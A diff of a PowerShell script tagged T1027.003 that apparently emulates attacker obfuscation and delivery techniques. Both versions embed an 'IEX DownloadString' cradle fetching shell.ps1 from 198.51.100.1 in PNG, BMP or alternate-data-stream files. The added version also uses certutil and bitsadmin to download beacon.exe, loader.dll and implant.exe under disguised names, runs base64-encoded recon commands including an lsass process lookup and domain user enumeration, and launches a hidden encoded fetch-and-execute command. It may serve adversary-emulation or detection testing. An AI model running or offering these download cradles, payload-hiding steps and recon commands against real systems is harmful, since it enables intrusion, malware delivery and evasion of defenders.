@@ -1,37 +1,50 @@
-$img = "$env:TEMP\update_logo.png"
-$payload = [System.Text.Encoding]::UTF8.GetBytes("powershell -ep bypass -nop -w hidden -c `"IEX(New-Object Net.WebClient).DownloadString('http://198.51.100.1/shell.ps1')`"")
-$pngHeader = [byte[]]@(0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A)
-$ihdr = [byte[]]@(0x00,0x00,0x00,0x0D,0x49,0x48,0x44,0x52,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x01,0x08,0x02,0x00,0x00,0x00,0x90,0x77,0x53,0xDE)
-$fakeChunk = [byte[]]@(0x00,0x00,0x01,0x00,0x74,0x45,0x58,0x74) + $payload + [byte[]]@(0x00,0x00,0x00,0x00)
-$iend = [byte[]]@(0x00,0x00,0x00,0x00,0x49,0x45,0x4E,0x44,0xAE,0x42,0x60,0x82)
-[System.IO.File]::WriteAllBytes($img, $pngHeader + $ihdr + $fakeChunk + $iend)
+Write-Host "[T1027.003] Steganography + Obfuscation" -ForegroundColor Red
 
-$extracted = [System.IO.File]::ReadAllBytes($img)
-$marker = [System.Text.Encoding]::ASCII.GetString($extracted) | Select-String -Pattern "powershell.*DownloadString" -AllMatches
-if ($marker) {
-    $decoded = $marker.Matches[0].Value
-    $scriptBlock = [ScriptBlock]::Create("Write-Output 'STEG_EXTRACTED'")
-    & $scriptBlock
+Write-Host "[1] certutil encode/decode chain..."
+$payload = "powershell.exe -ep bypass -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://198.51.100.1/shell.ps1')"
+$payload | Out-File "$env:TEMP\payload.txt" -Force
+& certutil.exe -encode "$env:TEMP\payload.txt" "$env:TEMP\payload.b64" 2>&1
+& certutil.exe -decode "$env:TEMP\payload.b64" "$env:TEMP\decoded.txt" 2>&1
+Write-Host "[+] certutil encode/decode complete" -ForegroundColor Yellow
+
+Write-Host "[2] certutil download pattern..."
+& certutil.exe -urlcache -split -f "http://198.51.100.1/beacon.exe" "$env:TEMP\winupdate.exe" 2>&1
+& certutil.exe -urlcache -split -f "http://198.51.100.1/loader.dll" "$env:TEMP\msedge.dll" 2>&1
+
+Write-Host "[3] Base64 encoded PowerShell..."
+$commands = @(
+    'whoami /all',
+    'Get-Process | Where-Object {$_.ProcessName -eq "lsass"}',
+    'net user /domain',
+    '[System.Net.Dns]::GetHostAddresses("dc01.corp.local")'
+)
+foreach ($c in $commands) {
+    $enc = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($c))
+    Write-Host "    Executing encoded: $($c.Substring(0, [Math]::Min(40, $c.Length)))..."
+    & powershell.exe -NoProfile -NonInteractive -EncodedCommand $enc 2>&1 | Out-Null
 }
 
-$bmpPayload = "$env:TEMP\report.bmp"
-$bmpHeader = [byte[]]@(0x42,0x4D) + [BitConverter]::GetBytes(1078 + $payload.Length) + (New-Object byte[] 4) + [BitConverter]::GetBytes(1078)
-$dibHeader = [BitConverter]::GetBytes(40) + [BitConverter]::GetBytes(1) + [BitConverter]::GetBytes(1) + [byte[]]@(0x01,0x00,0x18,0x00) + (New-Object byte[] 24)
-$bmpData = $bmpHeader + $dibHeader + (New-Object byte[] (1078 - 54)) + $payload
-[System.IO.File]::WriteAllBytes($bmpPayload, $bmpData)
+Write-Host "[4] ADS (Alternate Data Streams)..."
+"Normal document" | Out-File "$env:TEMP\report.txt" -Force
+$b64 = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($payload))
+Set-Content -Path "$env:TEMP\report.txt:hidden" -Value $b64
+$recovered = Get-Content -Path "$env:TEMP\report.txt:hidden"
+Write-Host "[+] Wrote and read ADS payload ($($recovered.Length) chars)" -ForegroundColor Yellow
 
-$b64Payload = [Convert]::ToBase64String($payload)
-$hiddenScript = "$env:TEMP\update_check.txt"
-"# Routine update check`n$b64Payload" | Out-File $hiddenScript -Force
-$recoveredBytes = [Convert]::FromBase64String(($b64Payload))
-$recoveredCmd = [System.Text.Encoding]::UTF8.GetString($recoveredBytes)
+Write-Host "[5] Payload in image file..."
+$pngHeader = [byte[]]@(0x89,0x50,0x4E,0x47,0x0D,0x0A,0x1A,0x0A)
+$payloadBytes = [Text.Encoding]::UTF8.GetBytes($payload)
+[IO.File]::WriteAllBytes("$env:TEMP\logo.png", $pngHeader + $payloadBytes)
+Write-Host "[+] Payload embedded in PNG" -ForegroundColor Yellow
 
-& certutil.exe -encode "$img" "$env:TEMP\encoded_img.b64" 2>&1 | Out-Null
-& certutil.exe -decode "$env:TEMP\encoded_img.b64" "$env:TEMP\decoded_img.png" 2>&1 | Out-Null
+Write-Host "[6] bitsadmin download..."
+& bitsadmin.exe /transfer evil /download /priority high "http://198.51.100.1/implant.exe" "$env:TEMP\taskhost.exe" 2>&1
 
-$altDS = "$env:TEMP\legit_doc.txt"
-"Normal document content" | Out-File $altDS -Force
-try { Set-Content -Path "${altDS}:hidden" -Value $b64Payload -ErrorAction Stop } catch {}
-try { $secret = Get-Content -Path "${altDS}:hidden" -ErrorAction Stop } catch {}
+Write-Host "[7] Invoke-WebRequest + IEX pattern..."
+$enc3 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("try{IEX(IWR 'http://198.51.100.1/ps_payload' -UseBasicParsing)}catch{}"))
+& powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -EncodedCommand $enc3 2>&1
 
-Remove-Item $img,$bmpPayload,$hiddenScript,"$env:TEMP\encoded_img.b64","$env:TEMP\decoded_img.png",$altDS -Force -ErrorAction SilentlyContinue
+Write-Host "[*] Cleanup..."
+Remove-Item "$env:TEMP\payload.txt","$env:TEMP\payload.b64","$env:TEMP\decoded.txt","$env:TEMP\winupdate.exe","$env:TEMP\msedge.dll","$env:TEMP\report.txt","$env:TEMP\logo.png","$env:TEMP\taskhost.exe" -Force -ErrorAction SilentlyContinue
+
+Write-Host "[T1027.003] Done." -ForegroundColor Cyan
